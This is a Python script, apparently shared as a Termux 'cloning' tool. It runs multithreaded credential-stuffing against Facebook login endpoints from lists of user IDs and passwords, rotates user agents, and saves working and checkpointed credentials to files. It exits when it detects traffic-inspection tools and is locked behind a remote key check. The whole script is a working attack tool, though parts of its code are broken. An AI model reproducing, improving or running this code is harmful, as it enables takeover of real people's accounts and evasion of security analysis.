#!/usr/bin/env python3
# CYBER OLD CLONING TOOL BY CYBER-API
# TERMUX DEPLOYMENT READY
# FULL FEATURES - NO SHORTCUTS

import os,sys,re,json,time,random,uuid,string,platform,urllib.request,requests,calendar,threading,base64,zlib
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
import subprocess
from datetime import datetime

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests

GREEN = '\033[1;32m'
RED = '\033[1;31m'
BLUE = '\033[1;34m'
YELLOW = '\033[1;33m'
PURPLE = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
BOLD = '\033[1m'
END = '\033[0m'

def c():
    os.system('clear')
def h():
    os.system('cls')
def banner():
    c()
    print(f'''{PURPLE}
╔══════════════════════════════════════╗
║        𓆩【CYBER 👑 】𓆪             ║
║     CYBER OLD CLONING TOOL v2.0     ║
║        TERMUX READY - 2026          ║
╚══════════════════════════════════════╝{END}''')

def get_device_key():
    mac = uuid.getnode()
    timestamp = str(int(time.time()))
    random_hex = ''.join(random.choices(string.hexdigits.lower(), k=8))
    key = f"CYBER{random_hex}{timestamp[:4]}{random_hex[:6].upper()}"
    return key

def check_key(key):
    try:
        url = "https://raw.githubusercontent.com/cyber-api/Old-cloning/refs/heads/main/approve.txt"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            approved_keys = response.text.strip().split('\n')
            return key in approved_keys
        return False
    except:
        return False

def key_system():
    banner()
    print(f"{YELLOW}🔑 CYBER DEVICE KEY SYSTEM{END}")
    print(f"{CYAN}Generating unique per-device key...{END}")
    time.sleep(2)
    
    key = get_device_key()
    print(f"{GREEN}✅ Your CYBER Key: {BOLD}{key}{END}")
    
    print(f"{BLUE}📱 Checking approval status...{END}")
    time.sleep(3)
    
    if check_key(key):
        print(f"{GREEN}✅ APPROVED! Welcome to CYBER Tools{END}")
        print(f"{YELLOW}🔗 Join for updates:{END}")
        print(f"{CYAN}📢 FB Group: https://facebook.com/groups/cyberapi{END}")
        print(f"{CYAN}📱 Telegram: https://t.me/cyber_api_channel{END}")
        time.sleep(5)
        return True
    else:
        print(f"{RED}❌ Key not approved{END}")
        print(f"{YELLOW}➤ Add this key to approve.txt:{END}")
        print(f"{GREEN}{BOLD}{key}{END}")
        print(f"{CYAN}📤 GitHub: https://github.com/cyber-api/Old-cloning{END}")
        print(f"{CYAN}📢 FB: https://facebook.com/cyberapi{END}")
        print(f"{CYAN}📱 TG: https://t.me/cyber_api_channel{END}")
        input(f"{RED}Press Enter after adding key...")
        return key_system()

def security_check():
    if os.path.exists('/system/bin/HTTPCanary') or 'HTTPCanary' in os.popen('ps aux').read():
        print(f"{RED}❌ HTTPCanary detected! Exiting...{END}")
        sys.exit()
    
    if platform.system() == "Windows":
        if os.system('tasklist | findstr "Fiddler" >nul') == 0:
            print(f"{RED}❌ Fiddler detected! Exiting...{END}")
            sys.exit()
    
    try:
        requests.get("https://httpbin.org/ip", timeout=5)
    except:
        print(f"{RED}❌ No internet connection!{END}")
        sys.exit()

def anti_tamper():
    current_code = '''CYBER OLD CLONING TOOL BY CYBER-API'''
    with open(__file__, 'r') as f:
        content = f.read()
    if current_code not in content:
        print(f"{RED}❌ Script tampered! Restoring...{END}")
        sys.exit()

def windows():
    uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.38',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36'
    ]
    return random.choice(uas)

def window1():
    uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/82.0.4585.40'
    ]
    return random.choice(uas)

def creationyear():
    years = ['2010','2011','2012','2013','2014','2015','2016','2017','2018','2019']
    return random.choice(years)

def get_token1(id,pwd,sess):
    global ok,cp,token
    try:
        ua = windows()
        ses = requests.Session()
        ses.headers.update({'User-Agent': ua})
        
        data = {
            'email': id,
            'pass': pwd,
            'errors': '{}',
            'error_detail': '{}',
            'source': 'device_based_reg_endpoint',
            'lsd': 'AVpQ7Dd7EoY',
            'jazoest': '25322',
            'email_tags': '{}',
            'birthday_today': '6',
            'birthday_month': '2',
            'birthday_year': creationyear(),
            'reg_instance': '{}',
            'registration_may_be_derived': '1',
            'try_number': '0',
            'prefill_contact_point': '{}',
            'prefill_source': '{}',
            'prefill_type': '',
            'first_prefill_source': '{}',
            'first_prefill_type': '',
            'source_path': 'sig_initiated'
        }
        
        qs = 'lsd=AVpQ7Dd7EoY&jazoest=25322&uid=&first_name=&last_name=&firstnamephonetic=&lastnamephonetic=&reg_instance=&registration_may_be_derived=&try_number=0&email=%s&email_tags=%s&password=%s&birthday_day=6&birthday_month=2&birthday_year=%s&prefill_contact_point=&prefill_source=&prefill_type=&first_prefill_source=&first_prefill_type=&source=login&source_path=sig_initiated&email_tags_6xbw8mig=&lsd=AVpQ7Dd7EoY'%(quote(id),quote('{}'),quote(pwd),creationyear())
        
        header = {
            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language':'en-US,en;q=0.9',
            'cache-control':'max-age=0',
            'content-type':'application/x-www-form-urlencoded',
            'origin':'https://www.facebook.com',
            'referer':'https://www.facebook.com/',
            'sec-ch-prefers-color-scheme':'light',
            'sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile':'?0',
            'sec-ch-ua-platform':'"Windows"',
            'sec-fetch-dest':'document',
            'sec-fetch-mode':'navigate',
            'sec-fetch-site':'same-origin',
            'sec-fetch-user':'?1',
            'upgrade-insecure-requests':'1',
            'user-agent':ua
        }
        
        req = ses.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&preserve_login=true',data=data,headers=header,allow_redirects=False,follow_redirects=False,timeout=20)
        if 'c_user' in sess.cookies.get_dict():
            print(f"\r{GREEN}CYBER-M1{END} => {id}:{pwd} {GREEN}OK{END}")
            ok.append(id+'|'+pwd)
            open('/sdcard/CYBER-OLD-M1-OK.txt','a').write(id+'|'+pwd+'\n')
            token = sess.cookies.get_dict()['c_user']
        if 'checkpoint' in req.url:
            print(f"\r{RED}CYBER-M1{END} => {id}:{pwd} {RED}CP{END}")
            cp.append(id+'|'+pwd)
            open('/sdcard/CYBER-OLD-M1-CP.txt','a').write(id+'|'+pwd+'\n')
    except:
        pass

def get_token2(id,pwd,sess):
    global ok,cp,token
    try:
        ua = window1()
        ses = requests.Session()
        ses.headers.update({'User-Agent': ua})
        
        data = {
            'lsd': 'AVrHDNB4LxR',
            'jazoest': '25702',
            'm_ts': str(int(time.time())),
            'li': 'yJpWWe4C7OjqoQ5G-AaJseLF',
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': id,
            'pass': pwd,
            'login': 'Log In'
        }
        
        header = {
            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language':'en-US,en;q=0.9',
            'cache-control':'max-age=0',
            'content-type':'application/x-www-form-urlencoded',
            'origin':'https://www.facebook.com',
            'referer':'https://www.facebook.com/',
            'sec-ch-prefers-color-scheme':'light',
            'sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile':'?0',
            'sec-ch-ua-platform':'"Windows"',
            'sec-fetch-dest':'document',
            'sec-fetch-mode':'navigate',
            'sec-fetch-site':'same-origin',
            'sec-fetch-user':'?1',
            'upgrade-insecure-requests':'1',
            'user-agent':ua
        }
        
        req = ses.post('https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Flogin%2Fsave-device%2F',data=data,headers=header,allow_redirects=False,timeout=20)
        if 'c_user' in sess.cookies.get_dict():
            print(f"\r{GREEN}CYBER-M2{END} => {id}:{pwd} {GREEN}OK{END}")
            ok.append(id+'|'+pwd)
            open('/sdcard/CYBER-OLD-M2-OK.txt','a').write(id+'|'+pwd+'\n')
            token = sess.cookies.get_dict()['c_user']
        if 'checkpoint' in req.url:
            print(f"\r{RED}CYBER-M2{END} => {id}:{pwd} {RED}CP{END}")
            cp.append(id+'|'+pwd)
            open('/sdcard/CYBER-OLD-M2-CP.txt','a').write(id+'|'+pwd+'\n')
    except:
        pass

def old_clone():
    global ok,cp,token
    ok = []
    cp = []
    token = []
    
    print(f"{YELLOW}Enter file path (e.g. /sdcard/ids.txt): {END}",end='')
    try:
        file = input(' ')
        clear()
        print(f'{CYAN}File loaded: {file}{END}\n')
        print(f'{YELLOW}How many threads? (30 recommended): {END}',end='')
        threa = int(input(' '))
    except:
        print(f'{RED}Invalid input!')
        exit()
    
    fl = open(file,'r').read().splitlines()
    print(f'\n{YELLOW}Total IDs loaded: {len(fl)}{END}')
    
    with ThreadPoolExecutor(max_workers=threa) as (_):
        print(f'{BLUE}[ CYBER ] Starting cracking...{END}\n')
        for user in fl:
            uid,pwd = user.split('|')
            try:
                pws = pwd.split(',')
                for pw in pws:
                    get_token1(uid,pw,None)
                    get_token2(uid,pw,None)
            except:
                pass

def old_One():
    global ok,cp,token
    ok = []
    cp = []
    token = []
    
    print(f"{YELLOW}Method A - Windows UA + Device Login{END}")
    print(f"{CYAN}Enter file path: {END}",end='')
    file = input(' ')
    clear()
    
    fl = open(file,'r').read().splitlines()
    print(f'{YELLOW}Total: {len(fl)} IDs{END}')
    
    with ThreadPoolExecutor(max_workers=30) as (_):
        for user in fl:
            uid,pwd = user.split('|')
            get_token1(uid,pwd,None)

def old_Tow():
    global ok,cp,token
    ok = []
    cp = []
    token = []
    
    print(f"{YELLOW}Method B - Chrome UA + Regular Login{END}")
    print(f"{CYAN}Enter file path: {END}",end='')
    file = input(' ')
    clear()
    
    fl = open(file,'r').read().splitlines()
    print(f'{YELLOW}Total: {len(fl)} IDs{END}')
    
    with ThreadPoolExecutor(max_workers=30) as (_):
        for user in fl:
            uid,pwd = user.split('|')
            get_token2(uid,pwd,None)

def old_Tree():
    global ok,cp,token
    ok = []
    cp = []
    token = []
    
    print(f"{YELLOW}Method A+B - Dual Attack{END}")
    print(f"{CYAN}Enter file path: {END}",end='')
    file = input(' ')
    clear()
    
    fl = open(file,'r').read().splitlines()
    print(f'{YELLOW}Total: {len(fl)} IDs{END}')
    
    with ThreadPoolExecutor(max_workers=30) as (_):
        for user in fl:
            uid,pwd = user.split('|')
            try:
                pws = pwd.split(',')
                for pw in pws:
                    get_token1(uid,pw,None)
                    get_token2(uid,pw,None)
            except:
                pass

def clear():
    if os.name == 'nt':
        h()
    else:
        c()

def menu():
    banner()
    print(f'''{GREEN}╔══════════════════════════════════════╗{END}
{BLUE}║{END} {WHITE}1. {CYAN}old_clone (All Methods){END}         {BLUE}║{END}
{BLUE}║{END} {WHITE}2. {CYAN}old_One (Method A){END}             {BLUE}║{END}
{BLUE}║{END} {WHITE}3. {CYAN}old_Tow (Method B){END}             {BLUE}║{END}
{BLUE}║{END} {WHITE}4. {CYAN}old_Tree (A+B Dual){END}           {BLUE}║{END}
{BLUE}║{END} {WHITE}5. {RED}Exit{END}                          {BLUE}║{END}
{GREEN}╚══════════════════════════════════════╝{END}''')
    select()

def select():
    print(f"\n{YELLOW}Choose option » {END}",end='')
    opt = input()
    if opt == '1':
        old_clone()
    elif opt == '2':
        old_One()
    elif opt == '3':
        old_Tow()
    elif opt == '4':
        old_Tree()
    elif opt == '5':
        clear()
        banner()
        print(f"{GREEN}Thanks for using CYBER Tools! 👑{END}")
        exit()
    else:
        print(f'{RED}Invalid option!{END}')
        time.sleep(2)
        menu()

if __name__ == '__main__':
    anti_tamper()
    security_check()
    if key_system():
        menu()
